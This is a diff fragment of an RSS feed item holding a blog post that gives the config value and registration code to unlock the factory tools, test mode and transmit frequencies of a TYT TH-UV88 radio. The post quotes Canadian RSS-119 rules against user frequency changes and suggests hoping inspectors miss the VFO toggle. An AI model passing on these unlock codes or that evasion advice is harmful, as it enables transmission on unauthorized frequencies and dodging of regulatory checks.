+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h1&gt;&lt;p&gt;To unlock the frequencies, factory tools, and test mode of your TYT TH-UV88:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Find the install location for the software (by default this is &lt;code&gt;C:/UV88 V1.00&lt;/code&gt;)&lt;/li&gt;
+&lt;li&gt;In the subdirectory &lt;code&gt;Uv88_SoftWare_Eng&lt;/code&gt; open the included &lt;code&gt;setting.ini&lt;/code&gt; file&lt;/li&gt;
+&lt;li&gt;Change the value of &lt;code&gt;OwnUsed&lt;/code&gt; to &lt;code&gt;ARRVIN&lt;/code&gt; and save it. You&amp;rsquo;ll need to launch the software as an administrator from now on.&lt;/li&gt;
+&lt;li&gt;Run TH-UV88.exe, you will get a popup asking for a reg code. Put in &lt;code&gt;13636922224&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;You now have access to the factory tuning tools and test mode. To unlock transmission frequencies:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Open the frequency range menu from the left-hand side of the app&lt;/li&gt;
+&lt;li&gt;Press &lt;code&gt;p&lt;/code&gt; to reveal another code box&lt;/li&gt;
+&lt;li&gt;Enter the code &lt;code&gt;13636922224&lt;/code&gt; again&lt;/li&gt;
+&lt;li&gt;Change the frequency values as needed and confirm&lt;/li&gt;
+&lt;li&gt;Write changes to your radio&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;whats-next&#34; &gt;What&amp;rsquo;s Next?
+&lt;span&gt;
+    &lt;a href=&#34;#whats-next&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h1&gt;&lt;p&gt;I haven&amp;rsquo;t played much with the factory tooling that&amp;rsquo;s unlocked. Some of it looks like it has a high potential for breaking things, and what I was really after
+(locking the front panel of the radio) doesn&amp;rsquo;t appear to be in there. But, some options for those of you who are more adventurous than me:
+&lt;img src=&#34;https://jcrumb.github.io/blogimages/tyt/basisadj.png&#34; alt=&#34;TYT Basis Adjustment&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I&amp;rsquo;m also still searching for a way to lock the handset out of VFO mode and allow only selecting from the loaded channels. This is required under section 3.2 of RSS-119 for Land Mobile
+use in Canada:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Transmitters With External Frequency Selection Controls&lt;/p&gt;
+&lt;p&gt;In order to prevent radio interference caused by end-user transmissions on unauthorized frequencies, transmitters with external frequency selection controls and/or frequency programming capability shall conform to the following:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Transmitters with external frequency selection controls shall operate only on authorized channels which have been preset by the manufacturer, equipment supplier, service technician or maintenance personnel.&lt;/li&gt;
+&lt;li&gt;Transmitters with frequency programming capability must have at least one of the following design characteristics, which prevent the user from altering the preset frequencies:&lt;/li&gt;
+&lt;li&gt;Transmitters with external controls available to the user can only be internally modified to place the equipment in the programmable mode. Furthermore, while in the programmable mode, the equipment is not capable of transmitting. The procedure for making the modification and altering the frequency program is not available to the user of the equipment.&lt;/li&gt;
+&lt;li&gt;Transmitters are programmed for frequencies through controls that are inaccessible to the user.&lt;/li&gt;
+&lt;li&gt;Transmitters are programmed for frequencies through the use of external devices or specifically programmed modules that are available only to the service technician or maintenance personnel.&lt;/li&gt;
+&lt;li&gt;Transmitters are programmed through cloning (i.e., copying a program directly from another transmitter) using devices and procedures that are available only to the service technician or maintenance personnel.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;It&amp;rsquo;s possible to do this, and the same model purchased in the U.S. has the panel locked out of the box. I have yet to find the relevant config in the software and it may be a true
+factory-only option. At your own risk, you may be able to just leave the radio in channelled mode and hope that anyone checking doesn&amp;rsquo;t know how to toggle back to VFO mode
+which is done by pressing the &lt;code&gt;#&lt;/code&gt; key.&lt;/p&gt;
+</description>
     </item>
+    
   </channel>
 </rss>
